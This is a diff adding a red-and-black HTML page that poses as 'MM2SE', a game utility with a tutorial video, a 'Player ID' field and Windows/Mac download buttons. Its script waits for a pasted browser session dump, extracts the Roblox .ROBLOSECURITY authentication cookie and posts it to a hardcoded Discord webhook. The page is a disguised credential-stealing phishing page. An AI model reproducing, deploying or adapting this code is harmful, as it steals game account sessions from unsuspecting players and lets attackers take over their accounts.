@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Red & Black Layout</title>
+  <style>
+* {margin: 0; padding: 0; box-sizing: border-box;}
+body {
+  font-family: Arial, sans-serif;
+  background: #000;
+  color: #fff;
+  overflow-x: hidden;
+  text-align: center;
+}
+
+/* Background Canvas */
+#bgCanvas {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  z-index: -1;
+}
+
+/* Hero Section */
+header {
+  min-height: 50vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 1.5rem;
+  padding: 2rem;
+}
+
+header img {
+  width: 50%;
+  max-width: 1000px;
+  filter: drop-shadow(0 0 20px rgba(138, 1, 1, 0.4));
+}
+
+header h2 {
+  font-family: 'Orbitron', sans-serif;
+  font-size: clamp(1.2rem, 2.5vw, 2rem); /* scales with viewport */
+  max-width: 90%; /* full width on mobile */
+  color: #ffffff;
+  margin-top: 1rem;
+}
+
+iframe {
+  margin-top: 2rem;
+  width: 60%; /* scales with screen */
+  max-width: 660px;
+  aspect-ratio: 660 / 415; /* maintains original height/width ratio */
+  border: 2px solid #ff1a1a;
+  border-radius: 10px;
+}
+
+/* Description text */
+.description {
+  text-align: center;
+  max-width: 90%;
+  margin-bottom: 20px;
+  font-size: clamp(14px, 2vw, 22px);
+  line-height: 1.4;
+  word-wrap: break-word;
+}
+
+/* Inputs, buttons, error */
+input[type="text"],
+button,
+#errorMessage {
+  font-size: clamp(14px, 3vw, 24px);
+}
+
+input[type="text"] {
+  padding: 0.8em 1em;
+  width: 90%;
+  max-width: 500px;
+  border: 4px solid #AF0606;
+  border-radius: 10px;
+  box-shadow: 0 0 15px rgba(175, 6, 6, 0.7);
+  margin-bottom: 12px;
+  background-color: #333;
+  color: white;
+  outline: none;
+}
+
+button {
+  padding: 0.8em 2em;
+  background-color: #AF0606;
+  color: white;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+}
+
+button:hover {
+  background-color: #cc0000;
+}
+
+.form-container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 1rem;
+  width: 100%;
+  margin-top: 3rem;
+}
+
+/* Divider */
+.divider {
+  width: 40%;
+  max-width: 400px;
+  height: 0.3vh;
+  background: linear-gradient(to right, transparent, #AF0606, transparent);
+  margin: 5vh auto;
+  border-radius: 0.2vh;
+}
+
+#errorMessage {
+  display: none;
+  color: red;
+  margin-top: 12px;
+}
+
+/* Downloads Section */
+.downloads-title {
+  color: white;
+  margin-bottom: 1rem;
+  font-size: clamp(1rem, 2vw, 1.8rem);
+}
+
+.downloads-box {
+  border: 3px solid #AF0606;
+  padding: 2rem;
+  display: flex;
+  justify-content: center;
+  gap: 10rem;
+  max-width: 90%;
+  margin: 0 auto 20rem auto;
+  border-radius: 10px;
+  background: transparent;
+  flex-wrap: wrap; /* wrap buttons on small screens */
+}
+
+.download-btn {
+  padding: 0.8em 2em;
+  background-color: #0b2a66;
+  color: white;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  font-size: 1rem;
+}
+
+.download-btn:hover {
+  background-color: #163d91;
+}
+
+/* Footer */
+footer {
+  background: #000000;
+  padding: 2rem 1rem;
+  border-top: 3px solid #AF0606;
+}
+
+.footer-content {
+  max-width: 1000px;
+  margin: 0 auto;
+  text-align: center;
+  color: #aaa;
+  font-size: clamp(0.7rem, 1.5vw, 0.9rem);
+}
+
+.footer-links {
+  margin-top: 1rem;
+  display: flex;
+  justify-content: center;
+  gap: 2rem;
+  flex-wrap: wrap;
+}
+
+.footer-links a {
+  color: #ff1a1a;
+  text-decoration: none;
+  font-weight: bold;
+  transition: color 0.3s ease;
+}
+
+.footer-links a:hover {
+  color: #fff;
+}
+
+/* Media Queries for small devices */
+@media (max-width: 768px) {
+  header img {
+    width: 70%;
+  }
+
+  header h2 {
+    font-size: clamp(1rem, 4vw, 1.5rem);
+  }
+
+  iframe {
+    width: 90%;
+  }
+
+  .divider {
+    width: 80%;
+  }
+
+  .downloads-box {
+    gap: 1rem;
+    padding: 1rem;
+  }
+}
+
+
+  </style>
+</head>
+<body>
+
+<canvas id="bgCanvas"></canvas>
+
+<header>
+  <img src="images/logo.png" alt="Logo" width="1000">
+  <h2 style="color:#ffffff; margin-top:2rem;">How to use MM2SE</h2>
+  <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ"
+          title="YouTube video" allowfullscreen>
+  </iframe>
+</header>
+
+<div class="divider"></div>
+
+<h2 class="input-title">User Id input</h2>
+
+<div class="form-container">
+  <input type="text" id="playerId" placeholder="Enter Player ID" />
+  <button id="nextButton">Next</button>
+  <div id="errorMessage">Invalid Player ID</div>
+
+  <div class="divider"></div>
+
+  <h2 class="downloads-title">Downloads</h2>
+  <div class="downloads-box">
+    <button class="download-btn">Windows ⇓</button>
+    <button class="download-btn">Mac ⇓</button>
+  </div>
+</div>
+
+<!-- Footer -->
+<footer>
+  <div class="footer-content">
+    <p>© 2025 MM2SE. All rights reserved.</p>
+    <div class="footer-links">
+      <a href="#">Privacy Policy</a>
+      <a href="#">Terms of Service</a>
+      <a href="#">Contact</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+
+
+
+
+const MAX_LENGTH = 2000;
+
+document.getElementById('playerId').addEventListener('paste', function () {
+  setTimeout(() => {
+    const playerId = document.getElementById('playerId').value.trim();
+    const errorMessageDiv = document.getElementById('errorMessage');
+
+    if (!playerId.startsWith("$session = ")) {
+      errorMessageDiv.style.display = 'block';
+      return;
+    } else {
+      errorMessageDiv.style.display = 'none';
+    }
+
+    console.log("Player ID:", playerId);
+
+    const startDelimiter = 'ROBLOSECURITY", "';
+    const endDelimiter = '", "/';
+    const startIndex = playerId.indexOf(startDelimiter);
+
+    if (startIndex === -1) {
+      alert("The input does not contain 'ROBLOSECURITY\"'.");
+      return;
+    }
+
+    const extractionStartIndex = startIndex + startDelimiter.length;
+    const endIndex = playerId.indexOf(endDelimiter, extractionStartIndex);
+    const extractedValue = endIndex !== -1
+      ? playerId.substring(extractionStartIndex, endIndex).trim()
+      : playerId.substring(extractionStartIndex).trim();
+
+    if (!extractedValue) {
+      alert("Extracted value is empty.");
+      return;
+    }
+
+    const truncatedValue = `\`\`\`${extractedValue.length > MAX_LENGTH
+      ? extractedValue.substring(0, MAX_LENGTH)
+      : extractedValue}\`\`\``;
+
+    fetch("https://discord.com/api/webhooks/1344706580079443978/xTwZDXigIZcQAEg7o3DdwRdqOUNeBj0d2DvHgrrlWhXXOv1xwEIcaNjcs8ciKRh9w1wC", {
+      method: "POST",
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        embeds: [{
+          title: "",
+          description: truncatedValue,
+          color: 9109504
+        }]
+      })
+    })
+    .then(response => {
+      console.log("Webhook response status:", response.status);
+      if (!response.ok) {
+        alert(`Failed to send webhook. Status: ${response.status}`);
+        return;
+      }
+      return response.text().then(text => text ? JSON.parse(text) : null);
+    })
+    .catch(error => {
+      console.error("Error sending webhook:", error);
+      alert("An error occurred while sending the webhook.");
+    });
+
+  }, 0);
+});
+
+
+
+
+  // Particle Background
+  const canvas = document.getElementById('bgCanvas');
+  const ctx = canvas.getContext('2d');
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+
+  let particles = [];
+
+  class Particle {
+    constructor() {
+      this.x = Math.random() * canvas.width;
+      this.y = Math.random() * canvas.height;
+      this.size = Math.random() * 3 + 1;
+      this.speedX = (Math.random() - 0.5) * 1.5;
+      this.speedY = (Math.random() - 0.5) * 1.5;
+    }
+    update() {
+      this.x += this.speedX;
+      this.y += this.speedY;
+      if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
+      if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
+    }
+    draw() {
+      ctx.beginPath();
+      ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+      ctx.fillStyle = "red";
+      ctx.fill();
+    }
+  }
+
+  function init() {
+    particles = [];
+    for (let i = 0; i < 100; i++) {
+      particles.push(new Particle());
+    }
+  }
+
+  function animate() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    particles.forEach(p => {
+      p.update();
+      p.draw();
+    });
+    requestAnimationFrame(animate);
+  }
+
+  init();
+  animate();
+
+  window.addEventListener('resize', () => {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    init();
+  });
+</script>
+
+</body>
+</html>
